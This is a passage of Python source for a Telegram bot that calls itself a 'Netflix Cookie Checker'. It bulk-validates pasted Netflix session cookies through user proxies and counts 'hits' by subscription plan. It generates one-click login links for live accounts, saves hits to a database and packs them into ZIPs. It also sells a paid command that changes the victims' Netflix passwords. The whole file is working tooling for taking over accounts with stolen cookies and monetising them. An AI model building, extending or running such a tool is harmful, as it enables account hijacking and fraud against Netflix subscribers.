                "text": text, "count": _cookie_count,
            }
            await update.message.reply_text(
                f"🔀 <b>How should I check {_cookie_count} cookie{'s' if _cookie_count != 1 else ''}?</b>\n\n"
                f"You have <b>{user_store.get_balance(uid)} 🪙</b> and your own proxies.\n"
                "<i>Set a default via /settings → Routing.</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=_routing_choice_keyboard(uid, user_store.get_balance(uid)),
            )
            return

        _ACTIVE_USERS[uid] = time.time()
        _force_direct, _user_proxies, _err_msg = await _get_check_params(uid, count=_cookie_count)
        if _err_msg is not None:
            _ACTIVE_USERS.pop(uid, None)
            await update.message.reply_text(_err_msg, parse_mode=ParseMode.HTML)
            return
    else:
        if uid:
            _ACTIVE_USERS[uid] = time.time()
        _force_direct, _user_proxies = False, None

    status_msg = await update.message.reply_text("⏳ Parsing cookie data…")
    try:
        await process_cookies(update, status_msg, text, source="pasted text",
                              force_direct=_force_direct, user_proxies=_user_proxies)
    except Exception as e:
        logger.exception("Error processing pasted text from user %s", uid)
        try:
            await status_msg.edit_text(
                f"⚠️ <b>Processing error</b>\n<i>{type(e).__name__}: {e}</i>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    finally:
        if uid:
            _ACTIVE_USERS.pop(uid, None)


# ---------------------------------------------------------------------------
# Session watchdog — auto-clears stuck sessions every 60 s
# ---------------------------------------------------------------------------

async def _session_watchdog() -> None:
    """
    Background coroutine that runs for the lifetime of the bot.
    Every 60 s it scans _ACTIVE_USERS for sessions that started more than
    SESSION_TIMEOUT_SEC ago and removes them so users can start a new check.
    This handles crashes, network drops, and any code path that forgets to
    call _ACTIVE_USERS.pop().
    """
    _STORE_TTL = 3 * 3600  # purge HITS/NAV entries older than 3 hours
    while True:
        await asyncio.sleep(60)
        now = time.time()

        # ── Stuck session cleanup ─────────────────────────────────────────────
        stuck = [uid for uid, ts in list(_ACTIVE_USERS.items())
                 if now - ts > SESSION_TIMEOUT_SEC]
        for uid in stuck:
            _ACTIVE_USERS.pop(uid, None)
            _USER_SESSION.pop(uid, None)
            logger.warning("Watchdog: auto-cleared stuck session for uid=%s", uid)

        # ── Stale GEN_LINK_STORE purge ───────────────────────────────────────
        try:
            stale_gen = [k for k, v in list(_GEN_LINK_STORE.items())
                         if now - v.get("ts", 0) > _STORE_TTL]
            for k in stale_gen:
                _GEN_LINK_STORE.pop(k, None)
        except Exception:
            pass


async def noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """No-op handler for display-only inline buttons (page counter)."""
    await update.callback_query.answer()


async def gen_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    On-demand NFToken generator for single checks.
    Triggered when the account check returned before the NFToken fetch finished.
    Generates the token, then edits the original result card to add login buttons.
    """
    from checker import generate_nftoken

    query = update.callback_query
    await query.answer("⏳ Generating login link…")

    try:
        _, session_key = query.data.split(":", 1)
    except ValueError:
        await query.answer("Invalid request.", show_alert=True)
        return

    entry = _GEN_LINK_STORE.pop(session_key, None)
    if not entry:
        await query.answer("Session expired — run a new check to get fresh links.", show_alert=True)
        return

    result = entry["result"]
    nf_id  = result.get("netflix_id", "")
    if not nf_id:
        await query.answer("❌ No NetflixId found in result.", show_alert=True)
        return

    loop = asyncio.get_running_loop()
    try:
        nft = await loop.run_in_executor(
            _EXECUTOR, generate_nftoken, {"NetflixId": nf_id}
        )
        result["nftoken"] = nft
        if nft.get("success"):
            new_txt = format_result(
                result, entry["idx"], entry["total"],
                source=entry["src"], user_id=entry["uid"],
            )
            kb = _login_keyboard(result)
            await query.edit_message_text(new_txt, parse_mode=ParseMode.HTML, reply_markup=kb)
        else:
            # Put it back so the user can retry
            _GEN_LINK_STORE[session_key] = entry
            result["nftoken"] = {"success": False, "error": "generating…"}
            await query.answer(
                f"❌ Could not generate link: {nft.get('error', 'unknown error')}. Tap the button to retry.",
                show_alert=True,
            )
    except Exception as _e:
        _GEN_LINK_STORE[session_key] = entry
        await query.answer(f"❌ Error: {_e}", show_alert=True)


# ---------------------------------------------------------------------------
# Core processing
# ---------------------------------------------------------------------------

async def process_cookies(
    update: Update, status_msg, cookie_text: str, source: str = "",
    force_direct: bool = False, user_proxies: list | None = None,
) -> None:
    sets = split_cookies_from_text(cookie_text)

    if not sets:
        await status_msg.edit_text("⚠️ No cookie data found.")
        return

    if len(sets) == 1:
        from checker import auto_parse_cookies
        c = auto_parse_cookies(sets[0])
        keys = [k for k in c if k in ("NetflixId", "SecureNetflixId", "nfvdid", "gsid")]
        await status_msg.edit_text(
            f"🍪 <b>Detected:</b> 1 account — {len(c)} cookies "
            f"({', '.join(keys) or '…'})\n🔍 Checking…",
            parse_mode=ParseMode.HTML,
        )
    else:
        await status_msg.edit_text(
            f"🍪 <b>Detected:</b> {len(sets)} accounts\n🔍 Starting bulk check…",
            parse_mode=ParseMode.HTML,
        )

    tuples = [(source or f"account_{i}", s, s) for i, s in enumerate(sets, 1)]
    await process_cookie_sets(update, status_msg, tuples,
                              force_direct=force_direct, user_proxies=user_proxies)


async def process_cookie_sets(
    update: Update,
    status_msg,
    cookie_sets: list[tuple[str, str, str]],
    force_direct: bool = False,
    user_proxies: list | None = None,
) -> None:
    loop = asyncio.get_running_loop()
    total = len(cookie_sets)
    is_bulk = total > 1

    if total == 0:
        await status_msg.edit_text("⚠️ No cookie data found.")
        return

    uid = update.effective_user.id if update.effective_user else 0
    hits_list: list[tuple[dict, str, str]] = []
    hits = frees = invalids = errors = on_hold = 0
    t_start = time.monotonic()
    session_id = status_msg.message_id
    # Register this session so /cancel can find it mid-run
    if uid:
        _USER_SESSION[uid] = session_id
    error_retry: list[tuple[str, str, str]] = []   # collect errored accounts for one retry

    for batch_start in range(0, total, BULK_CONCURRENCY):
        if session_id in _CANCEL_SESSIONS:
            _CANCEL_SESSIONS.discard(session_id)
            elapsed = time.monotonic() - t_start
            mins, secs = divmod(int(elapsed), 60)
            time_str = f"{mins}m {secs}s" if mins else f"{secs}s"
            try:
                await status_msg.edit_text(
                    f"🛑 <b>Cancelled</b>\n\n"
                    f"{make_progress_bar(batch_start, total)}  {batch_start}/{total}\n\n"
                    f"✅ {hits}  ❌ {invalids}  ⏸️ {on_hold}  🔓 {frees}  ⚠️ {errors}\n\n"
                    f"⏱️ {time_str}",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
            if hits_list:
                await update.message.reply_text(
                    f"📊 <b>Cancelled — Partial Summary</b>\n\n"
                    f"  ✅  Hits (Active)   »  <b>{hits}</b>\n"
                    f"  ⏸️  On Hold         »  <b>{on_hold}</b>\n"
                    f"  🔓  Free (No Sub)   »  <b>{frees}</b>\n"
                    f"  ❌  Invalid         »  <b>{invalids}</b>\n"
                    f"  ⚠️  Errors          »  <b>{errors}</b>\n\n"
                    f"  📦  Checked so far  »  <b>{batch_start}</b> / {total}",
                    parse_mode=ParseMode.HTML,
                )
                await send_hits_zip(update, hits_list)
            return

        batch = cookie_sets[batch_start: batch_start + BULK_CONCURRENCY]

        if is_bulk:
            done_so_far = batch_start
            elapsed = time.monotonic() - t_start
            speed = done_so_far / elapsed * 60 if elapsed > 1 and done_so_far > 0 else 0
            speed_str = f"🚀 {speed:.1f} acc/min" if speed > 0 else "🕐 Starting…"
            try:
                await status_msg.edit_text(
                    f"⚡ <b>Bulk Check in Progress</b>\n\n"
                    f"{make_progress_bar(done_so_far, total)}  {done_so_far}/{total}\n\n"
                    f"✅ {hits}  ❌ {invalids}  ⏸️ {on_hold}  🔓 {frees}  ⚠️ {errors}\n\n"
                    f"{speed_str}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=_cancel_keyboard(session_id),
                )
            except Exception:
                pass

        batch_results = await asyncio.gather(*[
            loop.run_in_executor(
                _EXECUTOR,
                functools.partial(
                    check_cookie,
                    generate_token=not is_bulk,
                    bulk_mode=is_bulk,
                    force_direct=force_direct,
                    user_proxies=user_proxies,
                ),
                cs,
            )
            for _src, cs, _raw in batch
        ], return_exceptions=True)

        for (src, cs, raw), result in zip(batch, batch_results):
            if isinstance(result, Exception):
                result = {"status": "error", "message": str(result)}

            status = result.get("status", "error")
            idx    = batch_start + batch.index((src, cs, raw)) + 1

            if status == "hit":
                hits += 1
                hits_list.append((result, src, raw))
            elif status == "free":
                frees += 1
            elif status == "on_hold":
                on_hold += 1
                hits_list.append((result, src, raw))
            elif status == "invalid":
                invalids += 1
            else:
                # Don't count as error yet — queue for one retry at the end
                if is_bulk:
                    error_retry.append((src, cs, raw))
                else:
                    errors += 1

            user_id = update.effective_user.id if update.effective_user else 0
            stats_tracker.record_check(status, user_id=user_id, source=src)
            if status in ("hit", "free", "on_hold"):
                mongodb_store.save_hit(result, user_id=user_id, source=src)
            result["_source"] = src

            # Single-check: always show full card.
            # Bulk: no individual cards — results sent at the end as login links.
            if not is_bulk:
                txt = format_result(result, idx, total, source=src, user_id=uid)
                kb  = _login_keyboard(result)
                # NFToken missed its grace window — offer on-demand generation
                if kb is None and status in ("hit", "on_hold"):
                    _GEN_LINK_STORE[str(session_id)] = {
                        "result": result, "idx": idx, "total": total,
                        "src": src, "uid": uid, "ts": time.time(),
                    }
                    kb = InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔑 Get Login Link", callback_data=f"genlink:{session_id}"),
                    ]])
                try:
                    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
                except Exception:
                    pass

        if is_bulk:
            # Small pause between batches — spreads Netflix requests over time,
            # prevents rate-limiting on direct mode, keeps event loop responsive.
            await asyncio.sleep(0.1)

    # ── Retry errored accounts once (full timeout, not bulk-mode) ─────────────
    if is_bulk and error_retry:
        try:
            await status_msg.edit_text(
                f"♻️ <b>Retrying {len(error_retry)} timed-out account(s)…</b>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

        # Retry with bulk settings (8s timeout, no retries) so this pass is fast.
        # If they still fail they become invalid — not error.
        retry_results = await asyncio.gather(*[
            loop.run_in_executor(
                _EXECUTOR,
                functools.partial(
                    check_cookie,
                    generate_token=False,
                    bulk_mode=True,
                    force_direct=force_direct,
                    user_proxies=user_proxies,
                ),
                cs,
            )
            for _src, cs, _raw in error_retry
        ], return_exceptions=True)

        for (src, cs, raw), result in zip(error_retry, retry_results):
            if isinstance(result, Exception):
                result = {"status": "invalid", "message": "Timeout after retry"}
            status = result.get("status", "invalid")
            if status == "hit":
                hits += 1
                hits_list.append((result, src, raw))
            elif status == "free":
                frees += 1
            elif status == "on_hold":
                on_hold += 1
                hits_list.append((result, src, raw))
            else:
                invalids += 1   # error after retry → count as invalid, not error
            stats_tracker.record_check(status, user_id=uid, source=src)
            result["_source"] = src

    elapsed = time.monotonic() - t_start
    speed   = total / elapsed * 60 if elapsed > 0 else 0
    mins, secs = divmod(int(elapsed), 60)
    time_str = f"{mins}m {secs}s" if mins else f"{secs}s"

    _CANCEL_SESSIONS.discard(session_id)
    _USER_SESSION.pop(uid, None)

    # ── Deduplicate hits_list before all counts / storage / ZIP ───────────────
    # hits_list is raw (may contain the same NetflixId from duplicate input cookies).
    # Without dedup the premium count in the summary card and the button label
    # are inflated vs what the ZIP actually contains.
    if is_bulk and hits_list:
        _seen_keys: set[str] = set()
        _deduped: list[tuple[dict, str, str]] = []
        for _item in hits_list:
            _nf_id = _item[0].get("netflix_id") or ""
            _key   = _nf_id  # full value — unique per account, no splitting
            if _key and _key in _seen_keys:
                continue
            if _key:
                _seen_keys.add(_key)
            _deduped.append(_item)
        if len(_deduped) < len(hits_list):
            # Recalculate per-status counters from deduped list
            hits    = sum(1 for r, _, _ in _deduped if r.get("status") == "hit")
            on_hold = sum(1 for r, _, _ in _deduped if r.get("status") == "on_hold")
        hits_list = _deduped

    if is_bulk:
        premium_count = sum(1 for r, _, _ in hits_list if "premium" in (r.get("plan_name") or "").lower())

        try:
            await status_msg.edit_text(
                f"✅ <b>Done!</b>  {make_progress_bar(total, total)}  {total}/{total}\n\n"
                f"⏱️ {time_str}  ·  🚀 {speed:.1f} acc/min",
                parse_mode=ParseMode.HTML,
                reply_markup=None,
            )
        except Exception:
            pass

        await update.message.reply_text(
            f"📊 <b>Bulk Check — Summary</b>\n\n"
            f"  ✅  Hits (Active)     »  <b>{hits}</b>  (🌟 Premium: {premium_count})\n"
            f"  ⏸️  On Hold           »  <b>{on_hold}</b>\n"
            f"  🔓  Free (No Sub)     »  <b>{frees}</b>\n"
            f"  ❌  Invalid/Expired   »  <b>{invalids}</b>\n"
            f"  ⚠️  Errors            »  <b>{errors}</b>\n\n"
            f"  📦  Total Checked     »  <b>{total}</b>\n"
            f"  ⏱️  Time              »  <b>{time_str}</b>\n"
            f"  🚀  Speed             »  <b>{speed:.1f} acc/min</b>",
            parse_mode=ParseMode.HTML,
        )

        if hits_list:
            delivery = _get_delivery(uid)

            if delivery == "cards":
                # ── Card-by-Card delivery mode ─────────────────────────────
                # Generate NFTokens for all hits in parallel first
                from checker import generate_nftoken as _generate_nftoken
                async def _ensure_token(result: dict) -> None:
                    nft = result.get("nftoken")
                    if not nft or not nft.get("success"):
                        nf_id = result.get("netflix_id")
                        if nf_id:
                            try:
                                t = await loop.run_in_executor(
                                    _EXECUTOR, _generate_nftoken, {"NetflixId": nf_id}
                                )
                                result["nftoken"] = t
                            except Exception:
                                pass

                token_notice = await update.message.reply_text(
                    f"⏳ <b>Generating login links for {len(hits_list)} hit(s)…</b>",
                    parse_mode=ParseMode.HTML,
                )
                await asyncio.gather(
                    *[_ensure_token(r) for r, _, _ in hits_list],
                    return_exceptions=True,
                )
                try:
                    await token_notice.delete()
                except Exception:
                    pass

                # Send each card individually with rate-limit handling
                card_total = len(hits_list)
                from telegram.error import RetryAfter as _RetryAfter
                for card_i, (c_result, c_src, _) in enumerate(hits_list, 1):
                    _retries = 0
                    while _retries < 3:
                        try:
                            c_txt = format_result(c_result, card_i, card_total, source=c_src, user_id=uid)
                            c_kb  = _login_keyboard(c_result)
                            await update.message.reply_text(
                                c_txt, parse_mode=ParseMode.HTML, reply_markup=c_kb
                            )
                            await asyncio.sleep(0.5)
                            break
                        except _RetryAfter as _ra:
                            _wait = int(_ra.retry_after) + 2
                            logger.warning("Card %d/%d: Telegram rate-limit, waiting %ds", card_i, card_total, _wait)
                            await asyncio.sleep(_wait)
                            _retries += 1
                        except Exception as _ce:
                            logger.warning("Card-by-card send failed for card %d: %s", card_i, _ce)
                            break
            else:
                # ── ZIP delivery mode (default) ────────────────────────────
                try:
                    zip_notice = await update.message.reply_text(
                        "⏳ <b>Generating login links &amp; building ZIP…</b>",
                        parse_mode=ParseMode.HTML,
                    )
                    await send_hits_zip(update, hits_list)
                    try:
                        await zip_notice.delete()
                    except Exception:
                        pass
                except Exception as _ze:
                    logger.exception("send_hits_zip failed after bulk check")
                    await update.message.reply_text(
                        f"⚠️ <b>Could not build hits ZIP.</b>\n"
                        f"<i>{type(_ze).__name__}: {_ze}</i>\n\n"
                        "Your hits are listed in the summary above.",
                        parse_mode=ParseMode.HTML,
                    )

                # ── Single best hit card ───────────────────────────────────
                try:
                    sorted_hits = sorted(hits_list, key=lambda x: _score_account(x[0]), reverse=True)
                    best_result, best_src, _ = sorted_hits[0]
                    best_txt = format_result(best_result, 1, 1, source=best_src, user_id=uid)
                    best_kb  = _login_keyboard(best_result)
                    full_best = (
                        f"🏆 <b>Best Hit from this batch</b>  ·  "
                        f"<i>top-ranked by plan · billing · member age</i>\n\n"
                        + best_txt
                    )
                    if len(full_best) > 4090:
                        full_best = full_best[:4087] + "…"
                    await update.message.reply_text(
                        full_best,
                        parse_mode=ParseMode.HTML,
                        reply_markup=best_kb,
                    )
                except Exception as _be:
                    logger.warning("Best hit card failed: %s", _be)
        else:
            await update.message.reply_text("📭 No hits found in this batch.")

    try:
        await status_msg.delete()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    if not BOT_TOKEN:
        raise ValueError("TELEGRAM_BOT_TOKEN is not set.")

    start_dashboard(port=5000)
    print("✅ Status dashboard running on port 5000")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        # Handle updates from multiple users truly concurrently
        .concurrent_updates(True)
        # Network timeouts — prevents hangs on slow Telegram API calls
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(15)
        .pool_timeout(10)
        .build()
    )

    # ── Command handlers ──────────────────────────────────────────────────
    app.add_handler(CommandHandler("start",       start_command))
    app.add_handler(CommandHandler("help",        help_command))
    app.add_handler(CommandHandler("info",        info_command))
    app.add_handler(CommandHandler("mode",        mode_command))
    app.add_handler(CommandHandler("fullinfo",    fullinfo_command))
    app.add_handler(CommandHandler("basic",       basic_command))
    app.add_handler(CommandHandler("settings",    settings_command))
    app.add_handler(CommandHandler("changepw",    changepw_command))
    app.add_handler(CommandHandler("cancel",      cancel_command))
    app.add_handler(CommandHandler("proxy",       proxy_command))
    app.add_handler(CommandHandler("setadmin",    setadmin_command))
    # ── User commands ──────────────────────────────────────────────────────
    app.add_handler(CommandHandler("account",     account_command))
    app.add_handler(CommandHandler("myproxy",     myproxy_command))
    app.add_handler(CommandHandler("buy",         buy_command))
    app.add_handler(CommandHandler("qr",          qr_command))
    # ── Admin management commands ─────────────────────────────────────────
    app.add_handler(CommandHandler("adminpanel",  adminpanel_command))
    app.add_handler(CommandHandler("userlist",    userlist_command))
    app.add_handler(CommandHandler("givetoken",   givetoken_command))
    app.add_handler(CommandHandler("grant",       grant_command))
    app.add_handler(CommandHandler("revoke",      revoke_command))
    app.add_handler(CommandHandler("userstatus",  userstatus_command))
    app.add_handler(CommandHandler("backup",      backup_command))
    app.add_handler(CommandHandler("setqr",       setqr_command))
    app.add_handler(CommandHandler("broadcast",   broadcast_command))

    # ── Inline button callbacks ───────────────────────────────────────────
    app.add_handler(CallbackQueryHandler(nav_callback,             pattern=r"^nav:"))
    app.add_handler(CallbackQueryHandler(account_refresh_callback, pattern=r"^account:refresh$"))
    app.add_handler(CallbackQueryHandler(changepw_confirm_callback, pattern=r"^changepw_confirm:"))
    app.add_handler(CallbackQueryHandler(routechoice_callback,     pattern=r"^routechoice:"))
    app.add_handler(CallbackQueryHandler(setroutepref_callback,    pattern=r"^setroutepref:"))
    app.add_handler(CallbackQueryHandler(proxy_admin_callback,     pattern=r"^proxy:"))
    app.add_handler(CallbackQueryHandler(userproxy_callback,       pattern=r"^uproxy:"))
    app.add_handler(CallbackQueryHandler(buy_callback,             pattern=r"^buy:"))
    app.add_handler(CallbackQueryHandler(cancel_callback,          pattern=r"^cancel:"))
    app.add_handler(CallbackQueryHandler(mode_callback,            pattern=r"^mode:"))
    app.add_handler(CallbackQueryHandler(setmode_callback,         pattern=r"^setmode:"))
    app.add_handler(CallbackQueryHandler(setdelivery_callback,     pattern=r"^setdelivery:"))
    app.add_handler(CallbackQueryHandler(closesettings_callback,   pattern=r"^closesettings$"))
    app.add_handler(CallbackQueryHandler(noop_callback,            pattern=r"^noop$"))
    app.add_handler(CallbackQueryHandler(gen_link_callback,        pattern=r"^genlink:"))

    # ── Payment handlers (Telegram Stars) ────────────────────────────────
    from telegram.ext import PreCheckoutQueryHandler as _PQ
    app.add_handler(_PQ(precheckout_callback))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment_handler))

    # ── Message handlers ──────────────────────────────────────────────────
    app.add_handler(MessageHandler(filters.PHOTO,                  handle_photo))
    app.add_handler(MessageHandler(filters.Document.ALL,           handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    # ── Global error handler — must be last ───────────────────────────────
    app.add_error_handler(error_handler)

    # ── Session watchdog + command menu registration ─────────────────────
    _watchdog_task: asyncio.Task | None = None

    async def _post_init(application: Application) -> None:
        nonlocal _watchdog_task
        _watchdog_task = asyncio.create_task(_session_watchdog())
        # Register bot commands so they appear in Telegram's / menu
        from telegram import BotCommand
        global _BOT_USERNAME
        _BOT_USERNAME = (await application.bot.get_me()).username or ""
        await application.bot.set_my_commands([
            BotCommand("start",      "🏠 Welcome & overview"),
            BotCommand("account",    "👤 My account & token balance"),
            BotCommand("buy",        "🪙 Buy tokens (Telegram Stars)"),
            BotCommand("qr",         "📲 External payment QR code"),
            BotCommand("myproxy",    "🔧 Manage your proxies"),
            BotCommand("changepw",   "🔐 Change Netflix password (5 tokens)"),
            BotCommand("settings",   "⚙️ Output format & delivery mode"),
            BotCommand("mode",       "Toggle Basic ↔ Full Info output"),
            BotCommand("help",       "📖 Supported cookie formats"),
            BotCommand("info",       "ℹ️ Bot stats & info"),
            BotCommand("cancel",     "❌ Cancel any active flow"),
            BotCommand("userlist",   "👥 Download full user list (admin)"),
            BotCommand("broadcast",  "📢 Broadcast message to all users (admin)"),
        ])

    async def _post_shutdown(application: Application) -> None:
        nonlocal _watchdog_task
        if _watchdog_task and not _watchdog_task.done():
            _watchdog_task.cancel()
            try:
                await _watchdog_task
            except asyncio.CancelledError:
                pass

    app.post_init     = _post_init
    app.post_shutdown = _post_shutdown

    print("✅ Netflix Cookie Checker Bot is running…")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=["message", "callback_query"],
    )


if __name__ == "__main__":
    main()
